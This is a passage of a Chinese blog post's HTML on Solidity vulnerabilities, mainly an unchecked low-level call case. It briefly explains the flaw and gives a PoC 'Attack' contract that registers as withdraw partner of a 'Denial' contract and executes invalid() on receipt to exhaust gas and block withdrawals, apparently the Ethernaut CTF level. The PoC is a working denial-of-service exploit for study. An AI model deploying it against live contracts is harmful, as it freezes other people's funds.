funds</span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    // convenience function</span><br><span class="line">    function contractBalance() public view returns (uint256) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>一眼就是未检查低级调用然后回滚，但是只是在revert函数里面加一个简单的回滚是不行的，只是不能用call了但是下面代码还是可以运行的所以，如果想不执行下面的代码直接在revert函数里面耗光gas直接不执行下面的代码</p>
<h1 id="Poc-3"><a href="#Poc-3" class="headerlink" title="Poc"></a>Poc</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: SEE LICENSE IN LICENSE</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;./Denial.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    Denial public target;</span><br><span class="line"></span><br><span class="line">    constructor(address _target) &#123;</span><br><span class="line">        target = Denial(payable(_target));</span><br><span class="line">        target.setWithdrawPartner(address(this));</span><br><span class="line">        target.withdraw();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            invalid()</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>





</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">三叶</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2025/03/20/%E5%90%88%E7%BA%A6%E4%B8%AD%E7%9A%84%E5%90%84%E7%A7%8D%E6%BC%8F%E6%B4%9E/">http://example.com/2025/03/20/%E5%90%88%E7%BA%A6%E4%B8%AD%E7%9A%84%E5%90%84%E7%A7%8D%E6%BC%8F%E6%B4%9E/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">三叶的故事</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/san-ye.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/03/14/hello-world/" title="Hello World"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">Hello World</div></div><div class="info-2"><div class="info-item-1">Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot;  More info: Writing Run server1$ hexo server  More info: Server Generate static files1$ hexo generate  More info: Generating Deploy to remote sites1$ hexo deploy  More info: Deployment </div></div></div></a><a class="pagination-related" href="/2025/03/20/solidity%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/" title="Solidity 学习笔记"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">Solidity 学习笔记</div></div><div class="info-2"><div class="info-item-1">其中solidity是一门专门用于编写智能合约的高级语言，在以太坊虚拟机上运行。它是一种静态类型语言，受 JavaScript、Python 和 C++ 的影响，具有合约、状态变量、函数修饰符和事件等概念，适用于去中心化应用（DApp）和区块链开发。 智能合约的概念智能合约（Smart Contract）是一种运行在区块链上的自执行合约，其条款以代码形式直接写入区块链。一旦满足设定的条件，合约便会自动执行，且不可篡改。智能合约通常用于去中心化金融（DeFi）、NFT、供应链管理等场景，以实现信任最小化和自动化交易。 1.变量类型常用三种类型： 1.值类型： 布尔型（bool),整数型（int)，正整数（uint）等 2.引用类型： 数组（arry[]),结构体（struct）等 3.映射类型：存储键值对的数据结构（mapping） 详细介绍1布尔型布尔型是二值变量，取值为 true 或 false。 1bool san = ture;  布尔值的运算符包括：  ! （逻辑非） &amp;&amp; （逻辑与，”and”） || （逻辑或，”or”） == （等于） !=...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/san-ye.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">三叶</div><div class="author-info-description">三叶的世界</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">3</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">2</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">1重入漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90"><span class="toc-number">1.1.</span> <span class="toc-text">例子</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%93%B6%E8%A1%8C%E5%90%88%E7%BA%A6"><span class="toc-number">1.1.1.</span> <span class="toc-text">银行合约</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%90%88%E7%BA%A6"><span class="toc-number">1.1.2.</span> <span class="toc-text">攻击合约</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%84%E9%98%B2%E6%96%B9%E6%B3%95"><span class="toc-number">1.1.3.</span> <span class="toc-text">预防方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5-%E5%BD%B1%E5%93%8D-%E4%BA%A4%E4%BA%92%E6%A8%A1%E5%BC%8F"><span class="toc-number">1.1.3.1.</span> <span class="toc-text">检查-影响-交互模式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%87%8D%E5%85%A5%E9%94%81"><span class="toc-number">1.1.3.2.</span> <span class="toc-text">重入锁</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2%E8%87%AA%E6%AF%81%E5%87%BD%E6%95%B0%EF%BC%88%E4%B8%8D%E5%8F%AF%E9%A2%84%E6%9C%9F%E7%9A%84ETH"><span class="toc-number">2.</span> <span class="toc-text">2自毁函数（不可预期的ETH)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%88%E7%BA%A6%E8%A7%A3%E6%9E%90"><span class="toc-number">2.1.</span> <span class="toc-text">合约解析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">2.2.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%90%88%E7%BA%A6%E4%BB%A3%E7%A0%81"><span class="toc-number">2.2.1.</span> <span class="toc-text">攻击合约代码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%95%E7%94%A8%E5%85%B7%E4%BD%93%E4%BE%8B%E5%AD%90%E4%BA%86%E8%A7%A3"><span class="toc-number">2.3.</span> <span class="toc-text">引用具体例子了解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="toc-number">2.4.</span> <span class="toc-text">修复建议</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3%E8%AE%BF%E9%97%AE%E7%A7%81%E6%9C%89%E5%8F%98%E9%87%8F"><span class="toc-number">3.</span> <span class="toc-text">3访问私有变量</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.</span> <span class="toc-text">4溢出漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-1"><span class="toc-number">4.1.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%90%88%E7%BA%A6-1"><span class="toc-number">4.2.</span> <span class="toc-text">攻击合约</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE-1"><span class="toc-number">4.3.</span> <span class="toc-text">修复建议</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#5%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA"><span class="toc-number">5.</span> <span class="toc-text">5整型溢出</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%90%88%E7%BA%A6%E4%BE%8B%E5%AD%90"><span class="toc-number">5.1.</span> <span class="toc-text">漏洞合约例子</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%84%E9%98%B2%E5%8A%9E%E6%B3%95"><span class="toc-number">5.2.</span> <span class="toc-text">预防办法</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#6%E8%96%85%E7%BE%8A%E6%AF%9B%E6%BC%8F%E6%B4%9E"><span class="toc-number">6.</span> <span class="toc-text">6薅羊毛漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%90%88%E7%BA%A6%E5%88%86%E6%9E%90"><span class="toc-number">6.0.0.0.1.</span> <span class="toc-text">合约分析</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="toc-number">6.0.1.</span> <span class="toc-text">解题思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%BC%94%E7%A4%BA"><span class="toc-number">6.0.2.</span> <span class="toc-text">攻击演示</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E8%87%AA%E6%AF%81%E7%BB%99%E9%A2%98%E7%9B%AE%E5%90%88%E7%BA%A6%E8%BD%AC%E5%B8%81"><span class="toc-number">6.0.2.1.</span> <span class="toc-text">1. 自毁给题目合约转币</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E4%BD%BF%E7%94%A8A%E5%9C%B0%E5%9D%80%E9%83%A8%E7%BD%B2%E6%9C%80%E7%BB%88%E8%B0%83%E7%94%A8%E8%80%85attack2%EF%BC%88%E5%90%88%E7%BA%A6%E5%9C%B0%E5%9D%80D%EF%BC%89"><span class="toc-number">6.0.3.</span> <span class="toc-text">2 使用A地址部署最终调用者attack2（合约地址D）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E4%BD%BF%E7%94%A8b%E5%9C%B0%E5%9D%80%E9%83%A8%E7%BD%B2%E8%8E%B7%E5%8F%96%E7%A9%BA%E6%8A%95%E7%9A%84%E5%90%88%E7%BA%A6attac%EF%BC%88%E5%90%88%E7%BA%A6E"><span class="toc-number">6.0.4.</span> <span class="toc-text">3.使用b地址部署获取空投的合约attac（合约E)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E4%BD%BF%E7%94%A8A%E5%9C%B0%E5%9D%80%E8%B0%83%E7%94%A8D%E5%90%88%E7%BA%A6%E7%9A%84exploit-%E5%87%BD%E6%95%B0"><span class="toc-number">6.0.4.1.</span> <span class="toc-text">4.使用A地址调用D合约的exploit()函数</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#7abi-encode%E5%92%8Cabi-encodePacked%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">7.</span> <span class="toc-text">7abi.encode和abi.encodePacked的区别</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Poc"><span class="toc-number">7.1.</span> <span class="toc-text">Poc</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#8%E5%9C%B0%E5%9D%80%E9%A2%84%E6%B5%8B"><span class="toc-number">8.</span> <span class="toc-text">8地址预测</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#create2-%E9%A2%84%E6%B5%8B%E5%9C%B0%E5%9D%80%E6%96%B9%E6%B3%95"><span class="toc-number">8.1.</span> <span class="toc-text">create2 预测地址方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%90%88%E7%BA%A6-2"><span class="toc-number">8.2.</span> <span class="toc-text">攻击合约</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Poc-1"><span class="toc-number">8.3.</span> <span class="toc-text">Poc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%96%85%E7%BE%8A%E6%AF%9B%E8%A7%A3%E6%B3%95"><span class="toc-number">8.4.</span> <span class="toc-text">薅羊毛解法</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#9delegatecall%E6%BC%8F%E6%B4%9E"><span class="toc-number">9.</span> <span class="toc-text">9delegatecall漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">9.1.</span> <span class="toc-text">原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#delegatecall-%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86"><span class="toc-number">9.1.1.</span> <span class="toc-text">delegatecall 的基本原理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%A0%B8%E5%BF%83%E7%82%B9"><span class="toc-number">9.2.</span> <span class="toc-text">漏洞的核心点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Poc-2"><span class="toc-number">9.3.</span> <span class="toc-text">Poc</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#10-%E6%9C%AA%E6%A3%80%E6%9F%A5%E7%9A%84%E4%BD%8E%E7%BA%A7%E8%B0%83%E7%94%A8"><span class="toc-number">10.</span> <span class="toc-text">10 未检查的低级调用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%8E%E7%BA%A7%E8%B0%83%E7%94%A8"><span class="toc-number">10.1.</span> <span class="toc-text">低级调用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BE%8B%E5%AD%90"><span class="toc-number">10.2.</span> <span class="toc-text">漏洞例子</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%93%B6%E8%A1%8C%E5%90%88%E7%BA%A6-1"><span class="toc-number">10.2.1.</span> <span class="toc-text">银行合约</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%90%88%E7%BA%A6-3"><span class="toc-number">10.3.</span> <span class="toc-text">攻击合约</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%84%E9%98%B2%E5%8A%9E%E6%B3%95-1"><span class="toc-number">10.4.</span> <span class="toc-text">预防办法</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Poc-3"><span class="toc-number">11.</span> <span class="toc-text">Poc</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/20/solidity%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/" title="Solidity 学习笔记">Solidity 学习笔记</a><time datetime="2025-03-19T23:00:00.000Z" title="发表于 2025-03-20 07:00:00">2025-03-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/20/%E5%90%88%E7%BA%A6%E4%B8%AD%E7%9A%84%E5%90%84%E7%A7%8D%E6%BC%8F%E6%B4%9E/" title="solidity 漏洞">solidity 漏洞</a><time datetime="2025-03-19T16:00:00.000Z" title="发表于 2025-03-20 00:00:00">2025-03-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/14/hello-world/" title="Hello World">Hello World</a><time datetime="2025-03-14T11:41:09.156Z" title="发表于 2025-03-14 19:41:09">2025-03-14</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2025 By 三叶</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.3.5</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>